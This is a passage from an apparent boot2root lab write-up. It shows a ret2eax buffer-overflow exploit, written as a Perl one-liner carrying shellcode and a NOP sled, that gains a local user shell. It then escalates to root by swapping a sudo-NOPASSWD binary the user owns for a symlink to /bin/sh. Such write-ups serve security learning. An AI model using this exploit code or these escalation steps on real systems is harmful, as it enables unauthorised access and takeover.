<p>Great, we can now leverage a ret2eax attack.  We&rsquo;ll just need to fill up the required 116 bytes prior to the EIP overwrite, then fill that with our CALL EAX:</p>

<p><code>
$ ./validate $(perl -e 'print "\xbe\x1f\x41\x25\xe8\xd9\xed\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1\x0c\x83\xc3\x04\x31\x73\x0f\x03\x73\x10\xa3\xd0\x82\x25\x7b\x82\x01\x5f\x13\x99\xc6\x16\x04\x89\x27\x5b\xa3\x4a\x50\xb4\x51\x22\xce\x43\x76\xe6\xe6\x59\x79\x07\xf7\x72\x1b\x6e\x99\xa3\xbf\x11\x16\xd3\x3f\x85\x8b\xaa\xa1\xe4\xac" . "\x90"x44 . "\x2b\x86\x04\x08"')
$ whoami
anansi
</code></p>

<p>Success; another local user.  I&rsquo;d like to briefly note that I had alot of issues getting shellcode to work if it was placed after the NOP sled, as opposed to before.</p>

<p>Now that we&rsquo;ve got our second account, we can hunt around the system in search of more binaries to exploit.  As our prior search discovered, nothing is suid root.  Checking out /home/anansi gives us:</p>

<p><code>
$ pwd &amp;&amp; ls -lh
/home/anansi/bin
total 8.0K
-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util
$ ./anansi_util
Usage: ./anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
</code></p>

<p>I couldn&rsquo;t find any segmentation faults with this, but I did note the following:</p>

<p>```
$ sudo -l
Matching Defaults entries for puck on this host:</p>

<pre><code>env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User puck may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /home/anansi/bin/anansi_util
</code></pre>

<p>```</p>

<p>It would appear we can <code>sudo ./anansi_util</code> without the need for a password.  And we own the binary!</p>

<p><code>
$ mv anansi_util anansi_util_bkp
$ ln -s /bin/sh ./anansi_util
$ ls -lh
total 8.0K
lrwxrwxrwx 1 anansi puck      7 Mar 31 15:27 anansi_util -&gt; /bin/sh
-rwxr-xr-x 1 anansi anansi 7.1K Mar  4 10:58 anansi_util_bkp
$ sudo ./anansi_util
$ whoami
root
</code></p>

<p>One of the more interesting boot2root&rsquo;s I&rsquo;ve had the privilege of exploiting, and a trend I hope to see continue.</p>
]]></content>
  </entry>
  
</feed>
